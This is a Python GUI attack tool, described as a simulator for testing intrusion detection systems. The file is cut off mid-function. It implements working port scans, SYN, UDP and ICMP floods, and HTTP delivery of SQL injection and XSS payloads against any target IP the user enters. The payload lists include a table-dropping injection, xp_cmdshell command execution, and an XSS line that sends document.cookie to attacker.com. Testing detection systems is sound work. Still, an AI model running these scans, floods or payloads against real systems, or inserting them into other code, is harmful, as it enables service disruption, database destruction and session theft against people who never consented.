#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击模拟器GUI - 用于测试入侵检测系统
提供图形界面来模拟各种网络攻击
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import socket
import time
import random
import sys
import os
from datetime import datetime
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sr1

# 全局变量
DEFAULT_TARGET = "127.0.0.1"
DEFAULT_PORT = 80
DEFAULT_DURATION = 10
DEFAULT_INTENSITY = 10
DEFAULT_START_PORT = 1
DEFAULT_END_PORT = 1000

# SQL注入攻击载荷
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT username, password FROM users--",
    "admin' --",
    "1'; DROP TABLE users--",
    "1' OR '1' = '1' UNION SELECT null, version() --",
    "' OR username LIKE '%admin%",
    "'; EXEC xp_cmdshell('net user');--",
    "' UNION SELECT @@version, NULL--",
    "' OR '1'='1'; INSERT INTO logs VALUES('hacked')--"
]

# XSS攻击载荷
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(`XSS`)'>",
    "'\"><script>alert(document.cookie)</script>",
    "<img src=x onerror=eval('al'+'ert(\"XSS\")')>",
    "<div onmouseover='alert(\"XSS\")'>XSS触发</div>",
    "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
]

class AttackSimulatorGUI:
    """攻击模拟器GUI类"""
    
    def __init__(self):
        """初始化GUI"""
        self.root = tk.Tk()
        self.root.title("攻击模拟器")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        
        # 设置图标（如果有）
        # self.root.iconbitmap("icon.ico")
        
        # 状态变量
        self.is_attacking = False
        self.attack_thread = None
        self.http_server = None
        self.http_server_thread = None
        
        # 创建界面
        self._create_widgets()
        
    def _create_widgets(self):
        """创建GUI组件"""
        # 主框架
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # 创建标签页
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 创建各个标签页
        self._create_port_scan_tab()
        self._create_dos_tab()
        self._create_sqli_tab()
        self._create_xss_tab()
        self._create_all_in_one_tab()
        self._create_http_server_tab()
        
        # 创建日志区域
        log_frame = ttk.LabelFrame(main_frame, text="攻击日志")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 日志文本框
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 状态栏
        status_frame = ttk.Frame(main_frame)
        status_frame.pack(fill=tk.X, padx=5, pady=2)
        
        self.status_var = tk.StringVar(value="就绪")
        ttk.Label(status_frame, textvariable=self.status_var).pack(side=tk.LEFT)
        
        # 版本信息
        version_label = ttk.Label(status_frame, text="攻击模拟器 v1.0")
        version_label.pack(side=tk.RIGHT)
        
    def _create_port_scan_tab(self):
        """创建端口扫描标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="端口扫描")
        
        # 目标设置
        target_frame = ttk.LabelFrame(tab, text="目标设置")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标IP
        ttk.Label(target_frame, text="目标IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.port_scan_target_var = tk.StringVar(value=DEFAULT_TARGET)
        ttk.Entry(target_frame, textvariable=self.port_scan_target_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 端口范围
        ttk.Label(target_frame, text="起始端口:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.start_port_var = tk.IntVar(value=DEFAULT_START_PORT)
        ttk.Entry(target_frame, textvariable=self.start_port_var).grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        
        ttk.Label(target_frame, text="结束端口:").grid(row=2, column=0, sticky="w", padx=5, pady=2)
        self.end_port_var = tk.IntVar(value=DEFAULT_END_PORT)
        ttk.Entry(target_frame, textvariable=self.end_port_var).grid(row=2, column=1, padx=5, pady=2, sticky="ew")
        
        # 扫描类型
        ttk.Label(target_frame, text="扫描类型:").grid(row=3, column=0, sticky="w", padx=5, pady=2)
        self.scan_type_var = tk.StringVar(value="TCP")
        scan_type_combo = ttk.Combobox(target_frame, textvariable=self.scan_type_var, values=["TCP", "SYN", "UDP"])
        scan_type_combo.grid(row=3, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        target_frame.columnconfigure(1, weight=1)
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.port_scan_start_btn = ttk.Button(button_frame, text="开始扫描", command=self._start_port_scan)
        self.port_scan_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.port_scan_stop_btn = ttk.Button(button_frame, text="停止扫描", command=self._stop_attack, state=tk.DISABLED)
        self.port_scan_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # 结果显示
        result_frame = ttk.LabelFrame(tab, text="扫描结果")
        result_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 结果树形视图
        columns = ("端口", "状态", "服务")
        self.port_scan_tree = ttk.Treeview(result_frame, columns=columns, show="headings")
        
        # 设置列标题
        for col in columns:
            self.port_scan_tree.heading(col, text=col)
            self.port_scan_tree.column(col, width=100)
        
        # 添加滚动条
        scrollbar = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.port_scan_tree.yview)
        self.port_scan_tree.configure(yscrollcommand=scrollbar.set)
        
        self.port_scan_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
    def _create_dos_tab(self):
        """创建DoS攻击标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="DoS攻击")
        
        # 目标设置
        target_frame = ttk.LabelFrame(tab, text="目标设置")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标IP
        ttk.Label(target_frame, text="目标IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.dos_target_var = tk.StringVar(value=DEFAULT_TARGET)
        ttk.Entry(target_frame, textvariable=self.dos_target_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 目标端口
        ttk.Label(target_frame, text="目标端口:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.dos_port_var = tk.IntVar(value=DEFAULT_PORT)
        ttk.Entry(target_frame, textvariable=self.dos_port_var).grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击类型
        ttk.Label(target_frame, text="攻击类型:").grid(row=2, column=0, sticky="w", padx=5, pady=2)
        self.dos_type_var = tk.StringVar(value="SYN")
        dos_type_combo = ttk.Combobox(target_frame, textvariable=self.dos_type_var, values=["SYN", "UDP", "ICMP"])
        dos_type_combo.grid(row=2, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击持续时间
        ttk.Label(target_frame, text="持续时间(秒):").grid(row=3, column=0, sticky="w", padx=5, pady=2)
        self.dos_duration_var = tk.IntVar(value=DEFAULT_DURATION)
        ttk.Entry(target_frame, textvariable=self.dos_duration_var).grid(row=3, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击强度
        ttk.Label(target_frame, text="攻击强度(包/秒):").grid(row=4, column=0, sticky="w", padx=5, pady=2)
        self.dos_intensity_var = tk.IntVar(value=DEFAULT_INTENSITY)
        ttk.Entry(target_frame, textvariable=self.dos_intensity_var).grid(row=4, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        target_frame.columnconfigure(1, weight=1)
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.dos_start_btn = ttk.Button(button_frame, text="开始攻击", command=self._start_dos_attack)
        self.dos_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.dos_stop_btn = ttk.Button(button_frame, text="停止攻击", command=self._stop_attack, state=tk.DISABLED)
        self.dos_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # 状态显示
        status_frame = ttk.LabelFrame(tab, text="攻击状态")
        status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.dos_status_text = scrolledtext.ScrolledText(status_frame, height=10)
        self.dos_status_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
    def _create_sqli_tab(self):
        """创建SQL注入攻击标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="SQL注入")
        
        # 提示标签
        tip_frame = ttk.Frame(tab)
        tip_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tip_label = ttk.Label(tip_frame, text="注意: 要使SQL注入攻击正常工作，必须先启动HTTP服务器，并将攻击目标端口设置为此服务器端口", 
                          foreground="red", font=("Arial", 10, "bold"))
        tip_label.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标设置
        target_frame = ttk.LabelFrame(tab, text="目标设置")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标IP
        ttk.Label(target_frame, text="目标IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.sqli_target_var = tk.StringVar(value=DEFAULT_TARGET)
        ttk.Entry(target_frame, textvariable=self.sqli_target_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 目标端口
        ttk.Label(target_frame, text="目标端口:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.sqli_port_var = tk.IntVar(value=DEFAULT_PORT)
        ttk.Entry(target_frame, textvariable=self.sqli_port_var).grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击次数
        ttk.Label(target_frame, text="攻击次数:").grid(row=2, column=0, sticky="w", padx=5, pady=2)
        self.sqli_count_var = tk.IntVar(value=DEFAULT_INTENSITY)
        ttk.Entry(target_frame, textvariable=self.sqli_count_var).grid(row=2, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        target_frame.columnconfigure(1, weight=1)
        
        # SQL注入载荷列表
        payload_frame = ttk.LabelFrame(tab, text="SQL注入载荷")
        payload_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.sqli_payload_text = scrolledtext.ScrolledText(payload_frame, height=5)
        self.sqli_payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 显示默认载荷
        for payload in SQL_INJECTION_PAYLOADS:
            self.sqli_payload_text.insert(tk.END, payload + "\n")
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.sqli_start_btn = ttk.Button(button_frame, text="开始攻击", command=self._start_sqli_attack)
        self.sqli_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.sqli_stop_btn = ttk.Button(button_frame, text="停止攻击", command=self._stop_attack, state=tk.DISABLED)
        self.sqli_stop_btn.pack(side=tk.LEFT, padx=5)
        
    def _create_xss_tab(self):
        """创建XSS攻击标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="XSS攻击")
        
        # 提示标签
        tip_frame = ttk.Frame(tab)
        tip_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tip_label = ttk.Label(tip_frame, text="注意: 要使XSS攻击正常工作，必须先启动HTTP服务器，并将攻击目标端口设置为此服务器端口", 
                          foreground="red", font=("Arial", 10, "bold"))
        tip_label.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标设置
        target_frame = ttk.LabelFrame(tab, text="目标设置")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标IP
        ttk.Label(target_frame, text="目标IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.xss_target_var = tk.StringVar(value=DEFAULT_TARGET)
        ttk.Entry(target_frame, textvariable=self.xss_target_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 目标端口
        ttk.Label(target_frame, text="目标端口:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.xss_port_var = tk.IntVar(value=DEFAULT_PORT)
        ttk.Entry(target_frame, textvariable=self.xss_port_var).grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击次数
        ttk.Label(target_frame, text="攻击次数:").grid(row=2, column=0, sticky="w", padx=5, pady=2)
        self.xss_count_var = tk.IntVar(value=DEFAULT_INTENSITY)
        ttk.Entry(target_frame, textvariable=self.xss_count_var).grid(row=2, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        target_frame.columnconfigure(1, weight=1)
        
        # XSS载荷列表
        payload_frame = ttk.LabelFrame(tab, text="XSS攻击载荷")
        payload_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.xss_payload_text = scrolledtext.ScrolledText(payload_frame, height=5)
        self.xss_payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 显示默认载荷
        for payload in XSS_PAYLOADS:
            self.xss_payload_text.insert(tk.END, payload + "\n")
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.xss_start_btn = ttk.Button(button_frame, text="开始攻击", command=self._start_xss_attack)
        self.xss_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.xss_stop_btn = ttk.Button(button_frame, text="停止攻击", command=self._stop_attack, state=tk.DISABLED)
        self.xss_stop_btn.pack(side=tk.LEFT, padx=5)
        
    def _create_all_in_one_tab(self):
        """创建综合攻击标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="综合攻击")
        
        # 目标设置
        target_frame = ttk.LabelFrame(tab, text="目标设置")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 目标IP
        ttk.Label(target_frame, text="目标IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.all_target_var = tk.StringVar(value=DEFAULT_TARGET)
        ttk.Entry(target_frame, textvariable=self.all_target_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 目标端口
        ttk.Label(target_frame, text="目标端口:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.all_port_var = tk.IntVar(value=DEFAULT_PORT)
        ttk.Entry(target_frame, textvariable=self.all_port_var).grid(row=1, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击持续时间
        ttk.Label(target_frame, text="持续时间(秒):").grid(row=2, column=0, sticky="w", padx=5, pady=2)
        self.all_duration_var = tk.IntVar(value=DEFAULT_DURATION)
        ttk.Entry(target_frame, textvariable=self.all_duration_var).grid(row=2, column=1, padx=5, pady=2, sticky="ew")
        
        # 攻击强度
        ttk.Label(target_frame, text="攻击强度:").grid(row=3, column=0, sticky="w", padx=5, pady=2)
        self.all_intensity_var = tk.IntVar(value=DEFAULT_INTENSITY)
        ttk.Entry(target_frame, textvariable=self.all_intensity_var).grid(row=3, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        target_frame.columnconfigure(1, weight=1)
        
        # 攻击类型选择
        attack_types_frame = ttk.LabelFrame(tab, text="攻击类型")
        attack_types_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.port_scan_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_types_frame, text="端口扫描", variable=self.port_scan_var).pack(anchor=tk.W, padx=5, pady=2)
        
        self.dos_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_types_frame, text="DoS攻击", variable=self.dos_var).pack(anchor=tk.W, padx=5, pady=2)
        
        self.sqli_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_types_frame, text="SQL注入", variable=self.sqli_var).pack(anchor=tk.W, padx=5, pady=2)
        
        self.xss_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(attack_types_frame, text="XSS攻击", variable=self.xss_var).pack(anchor=tk.W, padx=5, pady=2)
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.all_start_btn = ttk.Button(button_frame, text="开始综合攻击", command=self._start_all_attacks)
        self.all_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.all_stop_btn = ttk.Button(button_frame, text="停止攻击", command=self._stop_attack, state=tk.DISABLED)
        self.all_stop_btn.pack(side=tk.LEFT, padx=5)
        
    def _create_http_server_tab(self):
        """创建HTTP服务器标签页"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="HTTP服务器")
        
        # 重要提示标签
        tip_frame = ttk.Frame(tab)
        tip_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tip_label = ttk.Label(tip_frame, text="重要提示: 要使SQL注入和XSS攻击正常工作，必须先启动此HTTP服务器！", 
                          foreground="red", font=("Arial", 10, "bold"))
        tip_label.pack(fill=tk.X, padx=5, pady=5)
        
        # 服务器设置
        server_frame = ttk.LabelFrame(tab, text="服务器设置")
        server_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 端口
        ttk.Label(server_frame, text="端口:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.http_port_var = tk.IntVar(value=8000)
        ttk.Entry(server_frame, textvariable=self.http_port_var).grid(row=0, column=1, padx=5, pady=2, sticky="ew")
        
        # 配置列的权重
        server_frame.columnconfigure(1, weight=1)
        
        # 按钮
        button_frame = ttk.Frame(tab)
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        self.http_start_btn = ttk.Button(button_frame, text="启动HTTP服务器", command=self._start_http_server)
        self.http_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.http_stop_btn = ttk.Button(button_frame, text="停止HTTP服务器", command=self._stop_http_server, state=tk.DISABLED)
        self.http_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # 服务器日志
        log_frame = ttk.LabelFrame(tab, text="服务器日志")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.http_log_text = scrolledtext.ScrolledText(log_frame, height=10)
        self.http_log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
    def _log(self, message):
        """添加日志消息"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_message)
        self.log_text.see(tk.END)
        print(message)
    
    def _get_local_ip(self):
        """获取本机IP地址"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _disable_attack_buttons(self):
        """禁用所有攻击按钮"""
        self.port_scan_start_btn.config(state=tk.DISABLED)
        self.port_scan_stop_btn.config(state=tk.NORMAL)
        
        self.dos_start_btn.config(state=tk.DISABLED)
        self.dos_stop_btn.config(state=tk.NORMAL)
        
        self.sqli_start_btn.config(state=tk.DISABLED)
        self.sqli_stop_btn.config(state=tk.NORMAL)
        
        self.xss_start_btn.config(state=tk.DISABLED)
        self.xss_stop_btn.config(state=tk.NORMAL)
        
        self.all_start_btn.config(state=tk.DISABLED)
        self.all_stop_btn.config(state=tk.NORMAL)
    
    def _enable_attack_buttons(self):
        """启用所有攻击按钮"""
        self.port_scan_start_btn.config(state=tk.NORMAL)
        self.port_scan_stop_btn.config(state=tk.DISABLED)
        
        self.dos_start_btn.config(state=tk.NORMAL)
        self.dos_stop_btn.config(state=tk.DISABLED)
        
        self.sqli_start_btn.config(state=tk.NORMAL)
        self.sqli_stop_btn.config(state=tk.DISABLED)
        
        self.xss_start_btn.config(state=tk.NORMAL)
        self.xss_stop_btn.config(state=tk.DISABLED)
        
        self.all_start_btn.config(state=tk.NORMAL)
        self.all_stop_btn.config(state=tk.DISABLED)
    
    def _start_port_scan(self):
        """开始端口扫描攻击"""
        target = self.port_scan_target_var.get()
        start_port = self.start_port_var.get()
        end_port = self.end_port_var.get()
        scan_type = self.scan_type_var.get()
        
        if not target:
            messagebox.showerror("错误", "请输入目标IP")
            return
        
        if start_port >= end_port:
            messagebox.showerror("错误", "结束端口必须大于起始端口")
            return
        
        # 清空结果显示
        for item in self.port_scan_tree.get_children():
            self.port_scan_tree.delete(item)
        
        self._log(f"开始对 {target} 进行{scan_type}端口扫描 ({start_port}-{end_port})...")
        self.status_var.set(f"正在扫描: {target}")
        
        # 禁用所有攻击按钮
        self._disable_attack_buttons()
        
        # 在新线程中运行扫描
        self.is_attacking = True
        self.attack_thread = threading.Thread(
            target=self._port_scan_worker,
            args=(target, start_port, end_port, scan_type)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def _port_scan_worker(self, target_ip, start_port, end_port, scan_type):
        """端口扫描工作线程"""
        open_ports = []
        
        try:
            if scan_type == "TCP":
                # TCP连接扫描
                for port in range(start_port, end_port + 1):
                    if not self.is_attacking:
                        break
                    
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        result = sock.connect_ex((target_ip, port))
                        if result == 0:
                            open_ports.append(port)
                            service = self._get_service_name(port)
                            self._update_port_scan_result(port, "开放", service)
                            self._log(f"[+] 端口 {port}/tcp 开放 ({service})")
                        sock.close()
                    except:
                        pass
            
            elif scan_type == "SYN":
                # SYN扫描 (使用scapy)
                for port in range(start_port, end_port + 1):
                    if not self.is_attacking:
                        break
                    
                    try:
                        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                        response = sr1(packet, timeout=0.1, verbose=0)
                        if response and response.haslayer(TCP) and response[TCP].flags == 0x12:  # SYN-ACK
                            open_ports.append(port)
                            service = self._get_service_name(port)
                            self._update_port_scan_result(port, "开放", service)
                            self._log(f"[+] 端口 {port}/tcp 开放 ({service})")
                            # 发送RST包关闭连接
                            send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)
                    except Exception as e:
                        self._log(f"[!] 扫描端口 {port} 时出错: {e}")
            
            elif scan_type == "UDP":
                # UDP扫描
                for port in range(start_port, end_port + 1):
                    if not self.is_attacking:
                        break
                    
                    try:
                        packet = IP(dst=target_ip)/UDP(dport=port)
                        response = sr1(packet, timeout=0.1, verbose=0)
                        if response is None:
                            open_ports.append(port)
                            service = self._get_service_name(port)
                            self._update_port_scan_result(port, "可能开放", service)
                            self._log(f"[+] 端口 {port}/udp 可能开放 ({service})")
                    except Exception as e:
                        self._log(f"[!] 扫描端口 {port} 时出错: {e}")
        
        except Exception as e:
            self._log(f"[!] 扫描过程中出错: {e}")
        
        # 扫描完成
        if self.is_attacking:
            self.root.after(0, lambda: self._log(f"[*] 扫描完成，发现 {len(open_ports)} 个开放端口"))
            self.root.after(0, lambda: self.status_var.set(f"扫描完成: {target_ip}"))
        else:
            self.root.after(0, lambda: self._log("[!] 扫描被用户中断"))
            self.root.after(0, lambda: self.status_var.set("扫描已停止"))
        
        # 启用所有攻击按钮
        self.root.after(0, self._enable_attack_buttons)
        self.is_attacking = False
    
    def _update_port_scan_result(self, port, status, service):
        """更新端口扫描结果显示"""
        self.root.after(0, lambda: self.port_scan_tree.insert('', 'end', values=(port, status, service)))
    
    def _get_service_name(self, port):
        """获取端口对应的服务名称"""
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy"
        }
        return common_ports.get(port, "Unknown")
    
    def _start_dos_attack(self):
        """开始DoS攻击"""
        target = self.dos_target_var.get()
        port = self.dos_port_var.get()
        duration = self.dos_duration_var.get()
        intensity = self.dos_intensity_var.get()
        attack_type = self.dos_type_var.get()
        
        if not target:
            messagebox.showerror("错误", "请输入目标IP")
            return
        
        # 清空状态显示
        self.dos_status_text.delete(1.0, tk.END)
        
        self._log(f"开始对 {target}:{port} 进行 {attack_type} DoS攻击 (持续{duration}秒，{intensity}包/秒)...")
        self.status_var.set(f"正在攻击: {target}")
        
        # 禁用所有攻击按钮
        self._disable_attack_buttons()
        
        # 在新线程中运行攻击
        self.is_attacking = True
        self.attack_thread = threading.Thread(
            target=self._dos_attack_worker,
            args=(target, port, duration, intensity, attack_type)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def _dos_attack_worker(self, target_ip, target_port, duration, pps, attack_type):
        """实现DoS攻击"""
        try:
            end_time = time.time() + duration
            packet_count = 0
            start_time = time.time()
            
            while time.time() < end_time and self.is_attacking:
                try:
                    if attack_type == "SYN":
                        # 使用普通套接字模拟SYN攻击（不需要root权限）
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        # 只尝试连接，不完成三次握手
                        sock.connect_ex((target_ip, int(target_port)))
                        sock.close()
                    
                    elif attack_type == "UDP":
                        # 使用普通UDP套接字（不需要root权限）
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(b"X" * 1024, (target_ip, int(target_port)))
                        sock.close()

                    elif attack_type == "ICMP":
                        packet = IP(dst=target_ip) / ICMP()
                        send(packet, verbose=0)

                    packet_count += 1
                    
                    # 每秒更新一次状态
                    elapsed = time.time() - start_time
                    if int(elapsed) > 0 and packet_count % pps == 0:
                        current_pps = packet_count / elapsed
                        status = f"[*] 已发送 {packet_count} 个数据包, 速率: {current_pps:.2f} 包/秒\n"
                        self._update_dos_status(status)
                        time.sleep(1)  # 控制发包速率
                
                except Exception as e:
                    self._log(f"[!] 攻击过程中出错: {e}")
            
            # 攻击完成
            elapsed = time.time() - start_time
            if elapsed > 0:
                final_pps = packet_count / elapsed
                final_status = f"[*] DoS攻击完成，共发送 {packet_count} 个数据包, 平均速率: {final_pps:.2f} 包/秒"
                self._log(final_status)
                self._update_dos_status(final_status)
        
        except Exception as e:
            self._log(f"[!] DoS攻击过程中出错: {e}")
        
        # 攻击结束
        if self.is_attacking:
            self.root.after(0, lambda: self.status_var.set(f"DoS攻击完成: {target_ip}"))
        else:
            self.root.after(0, lambda: self._log("[!] DoS攻击被用户中断"))
            self.root.after(0, lambda: self.status_var.set("攻击已停止"))
        
        # 启用所有攻击按钮
        self.root.after(0, self._enable_attack_buttons)
        self.is_attacking = False
    
    def _update_dos_status(self, status):
        """更新DoS攻击状态显示"""
        self.root.after(0, lambda: self.dos_status_text.insert(tk.END, status))
        
    def _start_sqli_attack(self):
        """开始SQL注入攻击"""
        target = self.sqli_target_var.get()
        port = self.sqli_port_var.get()
        count = self.sqli_count_var.get()
        
        if not target:
            messagebox.showerror("错误", "请输入目标IP")
            return
        
        # 获取自定义载荷
        payloads = self.sqli_payload_text.get(1.0, tk.END).strip().split('\n')
        if not payloads or payloads == ['']:
            messagebox.showerror("错误", "请输入至少一个SQL注入载荷")
            return
        
        self._log(f"开始对 {target}:{port} 进行 SQL注入攻击...")
        self.status_var.set(f"正在攻击: {target}")
        
        # 禁用所有攻击按钮
        self._disable_attack_buttons()
        
        # 在新线程中运行攻击
        self.is_attacking = True
        self.attack_thread = threading.Thread(
            target=self._http_attack_worker,
            args=(target, port, "SQLI", payloads, count)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def _start_xss_attack(self):
        """开始XSS攻击"""
        target = self.xss_target_var.get()
        port = self.xss_port_var.get()
        count = self.xss_count_var.get()
        
        if not target:
            messagebox.showerror("错误", "请输入目标IP")
            return
        
        # 获取自定义载荷
        payloads = self.xss_payload_text.get(1.0, tk.END).strip().split('\n')
        if not payloads or payloads == ['']:
            messagebox.showerror("错误", "请输入至少一个XSS攻击载荷")
            return
        
        self._log(f"开始对 {target}:{port} 进行 XSS攻击...")
        self.status_var.set(f"正在攻击: {target}")
        
        # 禁用所有攻击按钮
        self._disable_attack_buttons()
        
        # 在新线程中运行攻击
        self.is_attacking = True
        self.attack_thread = threading.Thread(
            target=self._http_attack_worker,
            args=(target, port, "XSS", payloads, count)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def _http_attack_worker(self, target_ip, target_port, attack_type, payloads, count):
        """实现HTTP攻击（SQL注入或XSS）"""
        try:
            if attack_type == "SQLI":
                attack_name = "SQL注入"
            else:  # XSS
                attack_name = "XSS"
            
            self._log(f"[*] 开始对 {target_ip}:{target_port} 进行 {attack_name} 攻击...")
            
            for i in range(count):
                if not self.is_attacking:
                    break
                
                try:
                    # 随机选择一个载荷
                    payload = random.choice(payloads)
                    
                    # 构造HTTP请求
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    try:
                        result = sock.connect_ex((target_ip, int(target_port)))
                        if result != 0:
                            self._log(f"[!] 无法连接到目标 {target_ip}:{target_port}, 错误代码: {result}")
                            self._log(f"[!] 提示: 请先启动HTTP服务器标签页中的服务器，并将攻击端口设置为服务器端口")
                            time.sleep(1)  # 等待一秒再继续下一次尝试
                            continue
                    except Exception as e:
                        self._log(f"[!] 连接到目标时出错: {e}")
                        time.sleep(1)  # 等待一秒再继续下一次尝试
                        continue
                    
                    # 构造带有攻击载荷的HTTP请求
                    if attack_type == "SQLI":
                        http_request = f"GET /login?username={payload}&password=test HTTP/1.1\r\n"
                    else:  # XSS
                        http_request = f"GET /search?q={payload} HTTP/1.1\r\n"
                    
                    http_request += f"Host: {target_ip}\r\n"
                    http_request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    http_request += "Accept: text/html,application/xhtml+xml\r\n"
                    http_request += "Connection: close\r\n\r\n"
                    
                    # 发送HTTP请求
                    sock.send(http_request.encode())
                    
                    # 接收响应
                    try:
                        response = sock.recv(4096)
                        response_text = response.decode('utf-8', errors='ignore')
                    except:
                        response_text = "<无响应>"
                    
                    sock.close()
                    
